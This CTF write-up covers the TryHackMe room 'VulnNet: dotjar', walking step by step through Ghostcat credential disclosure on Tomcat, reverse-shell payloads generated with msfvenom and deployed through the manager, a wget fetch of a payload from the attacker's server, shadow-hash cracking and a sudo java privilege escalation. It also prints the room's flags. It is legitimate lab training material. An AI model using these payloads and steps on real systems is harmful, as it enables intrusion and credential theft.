<h1 align="center">VulnNet: dotjar</h1>
<p align="center">2025, August 12<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>463</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>VulnNet Entertainment never gives up... are you ready?</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/1952036c-7486-48f0-815b-06c84ba9b6d3"><br>
Access this CTF <a href="https://tryhackme.com/room/vulnnetdotjar">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/b32e8a76-f7e7-4d81-8f1c-1919e3c67518"></p>

<br>

<h2>Task 1 . VulnNet: dotjar</h2>
<p>VulnNet Entertainment works with the best and this is why they choose you again to perform a penetration test of their newly deployed service. Get ready!<br>

- Difficulty: Medium<br>
- Web Language: Java<br><br>

A new machine means a new web implementation. Foothold should be rather easy-going as long as you connect the dots. Privilege escalation might depend on your Java knowledge, don't worry though, I'm rather a person who avoids Java and I still had a lot of fun working on this machine.<br><br>

Icon made by Freepik from www.flaticon.com</p>

<p><em>Answer the questions below</em></p>


<br>
<h3>Nmap</h3>

```bash
:~/VulnNetDotJAR# nmap -A -T4 xx.xxx.xx.xxx
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http    Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
```

<br>

<p>

- Apache Tomcat - AJP Ghostcat
</p>

```bash
:~/VulnNetDotJAR# nmap --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p8009 xx.xxx.xx.xxx
...
PORT     STATE SERVICE
8009/tcp open  ajp13
| ajp-headers: 
|_  Content-Type: text/html;charset=UTF-8
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
| ajp-request: 
| AJP/1.3 200 200
| Content-Type: text/html;charset=UTF-8
| 
| tps://tomcat.apache.org/taglibs/">Taglibs</a></li>
|                             <li><a href="/docs/deployer-howto.html">Deployer</a></li>
|                         </ul>
|                     </div>
|                 </div>
|                 <div class="col20">
|                     <div class="container">
|                         <h4>Other Documentation</h4>
|                         <ul>
|                             <li><a href="https://tomcat.apache.org/connectors-doc/">Tomcat Connectors</a></li>
|                             <li><a href="https://tomcat.apache.org/connectors-doc/">mod_jk Documentation</a></li>
|                             <li><a href="https://tomcat.apache.org/native-doc/">Tomcat Native</a></li>
|                             <li><a href="/docs/deployer-howto.html">Deployer</a></li>
|                         </ul>
|                     </div>
|                 </div>
|                 <div class="col20">
|                     <div class="container">
|                         <h4>Get Involved</h4>
|                         <ul>
|                             <li><a href="https://tomcat.apache.org/getinvolved.html">Overview</a></li>
|                             <li><a href="https://tomcat.apache.org/source.html">Source Repositories</a></li>
|                             <li><a href="https://tomcat.apache.org/lists.html">Mailing Lists</a></li>
|                             <li><a href="https://wiki.apache.org/tomcat/FrontPage">Wiki</a></li>
|                         </ul>
|                     </div>
|                 </div>
|                 <div class="col20">
|                     <div class="container">
|                         <h4>Miscellaneous</h4>
|                         <ul>
|                             <li><a href="https://tomcat.apache.org/contact.html">Contact</a></li>
|                             <li><a href="https://tomcat.apache.org/legal.html">Legal</a></li>
|                             <li><a href="https://www.apache.org/foundation/sponsorship.html">Sponsorship</a></li>
|                             <li><a href="https://www.apache.org/foundation/thanks.html">Thanks</a></li>
|                         </ul>
|                     </div>
|                 </div>
|                 <div class="col20">
|                     <div class="container">
|                         <h4>Apache Software Foundation</h4>
|                         <ul>
|                             <li><a href="https://tomcat.apache.org/whoweare.html">Who We Are</a></li>
|                             <li><a href="https://tomcat.apache.org/heritage.html">Heritage</a></li>
|                             <li><a href="https://www.apache.org">Apache Home</a></li>
|                             <li><a href="https://tomcat.apache.org/resources.html">Resources</a></li>
|                         </ul>
|                     </div>
|                 </div>
|                 <br class="separator" />
|             </div>
|             <p class="copyright">Copyright &copy;1999-2025 Apache Software Foundation.  All Rights Reserved</p>
|         </div>
|     </body>
| 
|_</html>
```

<br>
<h3>CVE-2020-1938</h3>

<img width="1899" height="465" alt="image" src="https://github.com/user-attachments/assets/ca37932d-d7b9-40ad-b52c-f88e7bb9fd40" />


<br>
<h3>/etc/hosts</h3>

```bash
echo xx.xxx.xx.xxx dotjar.thm >> /etc/hosts
```

<br>
<h3>Gobuster</h3>

```bash
:~/VulnNetDotJAR# gobuster dir -u http://dotjar.thm:8080/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
...
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
...
```


```bash
:~/VulnNetDotJAR# gobuster dir -u http://dotjar.thm:8080/manager/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
...
/images               (Status: 302) [Size: 0] [--> /manager/images/]
/html                 (Status: 401) [Size: 2499]
/text                 (Status: 401) [Size: 2499]
/status               (Status: 401) [Size: 2499]
...
```

<br>
<h3>xx.xxx.xx.xxx:8080</h3>

<img width="1123" height="715" alt="image" src="https://github.com/user-attachments/assets/0502e9d0-9ea6-46ed-b052-20b7aa487ba5" />

<br>
<h3>msfvenom</h3>
<p>

- reverse shell <code>rev.war</code></p>

<br>

```bash
:~/VulnNetDotJAR# msfvenom -p java/jsp_shell_reverse_tcp LHOST=xx.xxx.x.xx LPORT=4444 -f war -o rev.war
Payload size: 1100 bytes
Final size of war file: 1100 bytes
Saved as: rev.war
```

<br>

```bash
msf6 > search ghostcat

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  auxiliary/admin/http/tomcat_ghostcat  2020-02-20       normal  Yes    Apache Tomcat AJP File Read


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/http/tomcat_ghostcat

msf6 > use 0
msf6 auxiliary(admin/http/tomcat_ghostcat) > set RHOSTS xx.xxx.xx.xxx
RHOSTS => xx.xxx.xx.xxx
msf6 auxiliary(admin/http/tomcat_ghostcat) > set Verbose True
Verbose => true
msf6 auxiliary(admin/http/tomcat_ghostcat) > run
[*] Running module against xx.xxx.xx.xxx
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>VulnNet Entertainment</display-name>
  <description>
     VulnNet Dev Regulations - mandatory
 
1. Every VulnNet Entertainment dev is obligated to follow the rules described herein according to the contract you signed.
2. Every web application you develop and its source code stays here and is not subject to unauthorized self-publication.
-- Your work will be reviewed by our web experts and depending on the results and the company needs a process of implementation might start.
-- Your project scope is written in the contract.
3. Developer access is granted with the credentials provided below:
 
    webdev:**********$Fa@21
 
GUI access is disabled for security reasons.
 
4. All further instructions are delivered to your business mail address.
5. If you have any additional questions contact our staff help branch.
  </description>

</web-app>
[+] xx.xxx.xx.xxx:8009 - File contents save to: /root/.msf4/loot/20250812xxxxxx_default_xx.xxx.xx.xxx_WEBINFweb.xml_200413.txt
[*] Auxiliary module execution completed
msf6 auxiliary(admin/http/tomcat_ghostcat) > 
```

<br>
<h3>Credentials</h3>

```bash
webdev:**********$Fa@21
```

<br>
<h3>Login</h3>

<img width="1129" height="720" alt="image" src="https://github.com/user-attachments/assets/04938d49-0cde-46a5-a273-f31cad2e7035" />

<br>
<br>

<img width="1131" height="718" alt="image" src="https://github.com/user-attachments/assets/5f6dfabc-7515-44b5-bf3f-16ee778e6a7c" />

<br><br>
<h3>Upload <code>rev.war</code></h3>


```bash
:~/VulnNetDotJAR# curl --upload-file rev.war -u webdev:'**********$Fa@21' 'http://dotjar.thm:8080/manager/text/deploy?path=/'
OK - Deployed application at context path [/rev.war]
```

<br>

<img width="1223" height="193" alt="image" src="https://github.com/user-attachments/assets/f8fd29d2-aaa1-4cbc-b672-6667b79e96ca" />

<br><br>
<h3>Shell as <code>web</code></h3>

```bash
web@ip-xx-xxx-xx-xxx:/$ cd /home
web@ip-xx-xxx-xx-xxx:/home$ ls
jdk-admin  ssm-user  ubuntu  web
```

<br>

```bash
web@ip-xx-xxx-xx-xxx:/$ ls -lah /var/backups/shadow-backup-alt.gz
-rw-r--r-- 1 root root 485 Jan 16  2021 /var/backups/shadow-backup-alt.gz
```

<br>

```bash
web@ip-xx-xxx-xx-xxx:/$ file /var/backups/shadow-backup-alt.gz
/var/backups/shadow-backup-alt.gz: gzip compressed data, was "shadow", last modified: Sat Jan 16 12:44:11 2021, from Unix, original size modulo 2^32 1179
```

<br>

```bash
web@ip-xx-xxx-xx-xxx:/dev/shm$ cp /var/backups/shadow-backup-alt.gz .
```

<br>

```bash
web@ip-xx-xxx-xx-xxx:/dev/shm$ gunzip shadow-backup-alt.gz
```

<br>

```bash
web@ip-xx-xxx-xx-xxx:/dev/shm$ ls
shadow-backup-alt
```

<br>

```bash
web@ip-xx-xxx-xx-xxx:/dev/shm$ file shadow-backup-alt
shadow-backup-alt: ASCII text
```

<br>

```bash
web@ip-xx-xxx-xx-xxx:/dev/shm$ cat shadow-backup-alt
root:$6$FphZT5C5$cH1.ZcqBlBpjzn2k.w8uJ8sDgZw6Bj1NIhSL63pDLdZ9i3k41ofdrs2kfOBW7cxdlMexHZKxtUwfmzX/UgQZg.:18643:0:99999:7:::
...
jdk-admin:$6$PQQxGZw5$fSSXp2EcFX0RNNOcu6uakkFjKDDWGw1H35uvQzaH44.I/5cwM0KsRpwIp8OcsOeQcmXJeJAk7SnwY6wV8A0z/1:18643:0:99999:7:::
web:$6$hmf.N2Bt$FoZq69tjRMp0CIjaVgjpCiw496PbRAxLt32KOdLOxMV3N3uMSV0cSr1W2gyU4wqG/dyE6jdwLuv8APdqT8f94/:18643:0:99999:7:::
```

<br>

```bash
web@ip-xx-xxx-xx-xxx:/dev/shm$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
jdk-admin:x:1000:1000:jdk-admin,,,:/home/jdk-admin:/bin/bash
web:x:1001:1001:,,,:/home/web:/bin/bash
...
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ssm-user:x:1002:1002::/home/ssm-user:/bin/sh
...
ubuntu:x:1003:1004:Ubuntu:/home/ubuntu:/bin/bash
```

<br>
<h3>Unshadow</h3>

```bash
:~/VulnNetDotJAR# unshadow passwd.txt shadow.txt
root:$6$FphZT5C5$cH1.ZcqBlBpjzn2k.w8uJ8sDgZw6Bj1NIhSL63pDLdZ9i3k41ofdrs2kfOBW7cxdlMexHZKxtUwfmzX/UgQZg.:0:0:root:/root:/bin/bash
...
jdk-admin:$6$PQQxGZw5$fSSXp2EcFX0RNNOcu6uakkFjKDDWGw1H35uvQzaH44.I/5cwM0KsRpwIp8OcsOeQcmXJeJAk7SnwY6wV8A0z/1:1000:1000:jdk-admin,,,:/home/jdk-admin:/bin/bash
web:$6$hmf.N2Bt$FoZq69tjRMp0CIjaVgjpCiw496PbRAxLt32KOdLOxMV3N3uMSV0cSr1W2gyU4wqG/dyE6jdwLuv8APdqT8f94/:1001:1001:,,,:/home/web:/bin/bash
...
ssm-user:x:1002:1002::/home/ssm-user:/bin/sh
...
ubuntu:x:1003:1004:Ubuntu:/home/ubuntu:/bin/bash
```

<br><br>

<img width="1312" height="729" alt="image" src="https://github.com/user-attachments/assets/debf80c1-e713-4743-bc0b-9ff98a68b809" />

<br><br>
<h3>hashes</h3>

```bash
root:$6$FphZT5C5$cH1.ZcqBlBpjzn2k.w8uJ8sDgZw6Bj1NIhSL63pDLdZ9i3k41ofdrs2kfOBW7cxdlMexHZKxtUwfmzX/UgQZg.:0:0:root:/root:/bin/bash
jdk-admin:$6$PQQxGZw5$fSSXp2EcFX0RNNOcu6uakkFjKDDWGw1H35uvQzaH44.I/5cwM0KsRpwIp8OcsOeQcmXJeJAk7SnwY6wV8A0z/1:1000:1000:jdk-admin,,,:/home/jdk-admin:/bin/bash
web:$6$hmf.N2Bt$FoZq69tjRMp0CIjaVgjpCiw496PbRAxLt32KOdLOxMV3N3uMSV0cSr1W2gyU4wqG/dyE6jdwLuv8APdqT8f94/:1001:1001:,,,:/home/web:/bin/bash
```

<br>
<h3>John the Ripper</h3>
<p>

- jdk-admin : 794613852</p>

```bash
:~/VulnNetDotJAR# john hashes --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt
...
794613852        (jdk-admin)
```

<br>
<h3>Privilege Escalation</h3>

```bash
web@ip-xx-xxx-xx-xxx:/dev/shm$ su jdk-admin
Password: 
jdk-admin@ip-xx-xxx-xx-xxx:/dev/shm$ 
```

<br>

```bash
jdk-admin@ip-xx-xxx-xx-xxx:~$ ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
jdk-admin@ip-xx-xxx-xx-xxx:~$ cat user.txt
THM{1ae87fa6ec2cd9f840c68cbad78e9351}
```

<br>

<p>1.1. What is the user flag? (user.txt)<br>
<code>THM{1ae87fa6ec2cd9f840c68cbad78e9351}</code></p>

<br>


```bash
jdk-admin@ip-xx-xxx-xx-xxx:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

Password: 
Matching Defaults entries for jdk-admin on ip-xx-xxx-xx-xxx:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jdk-admin may run the following commands on ip-xx-xxx-xx-xxx:
    (root) /usr/bin/java -jar *.jar
```

<br>
<h3>msfvenom</h3>
<p>

- reverse shell <code>rev.jar</code></p>

<br>

```bash
:~/VulnNetDotJAR# msfvenom -p java/shell_reverse_tcp LHOST=xx.xxx.x.xx LPORT=9001 -f jar > rev.jar
Payload size: 7502 bytes
Final size of jar file: 7502 bytes
```

<br>
<h3>Listener</h3>

```bash
:~/VulnNetDotJAR# nc -nlvp 9001
```

<br>
<h3>HTTP server</h3>

```bash
:~/VulnNetDotJAR# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

<br>
<h3>Reverse Shell Download</h3>

```bash
jdk-admin@ip-xx-xxx-xx-xxx:/dev/shm$ wget http://xx.xxx.x.xx:8000/rev.jar
...
```

<br>
<h3>HTTP server</h3>

```bash
:~/VulnNetDotJAR# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
xx.xxx.xx.xxx - - [12/Aug/2025 xx:xx:xx] "GET /rev.jar HTTP/1.1" 200 -
```

<br>
<h3>Privilege Escalation</h3>

```bash
jdk-admin@ip-xx-xxx-xx-xxx:/dev/shm$ sudo /usr/bin/java -jar rev.jar
Password: 
```

<br>
<h3>Shell as Root</h3>

```bash
:~/VulnNetDotJAR# nc -nlvp 9001
Listening on 0.0.0.0 9001
Connection received on xx.xxx.xx.xxx 57174
id
uid=0(root) gid=0(root) groups=0(root)
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@ip-xx-xxx-xx-xxx:/dev/shm#
```

<br>

```bash
root@ip-xx-xxx-xx-xxx:/dev/shm# cat /root/root.txt
cat /root/root.txt
THM{464c29e3ffae05c2e67e6f0c5064759c}
```


<br>

<p>1.2. What is the root flag? (root.txt)<br>
<code>THM{464c29e3ffae05c2e67e6f0c5064759c}</code></p>

<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/ad1d913c-01e8-47e9-a5a2-68d2a3804f3a"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/adb1374b-f9eb-41b3-807d-c30239a9778d"></p>

<br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 12   |   463    |     127ᵗʰ    |      5ᵗʰ     |     361ˢᵗ   |     7ᵗʰ    | 120,656  |    911    |    73     |


</div>

<p align="center">Global All Time:   127ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/6dd218dd-da2b-4fdb-8f9c-ff99ac02d3d2"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/20774ffa-238e-4b00-b347-675e21d1c9cb"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/10688cef-9967-4cd1-be27-8f840a03ee5d"><br>
                  Global monthly:    361ˢᵗ<br><img width="1200px" src="https://github.com/user-attachments/assets/1b00abab-4b85-49fe-9ab8-e610306b94f6"><br>
                  Brazil monthly:      7ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/196b77e7-c3fe-4f32-94d8-407b9e70838b"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
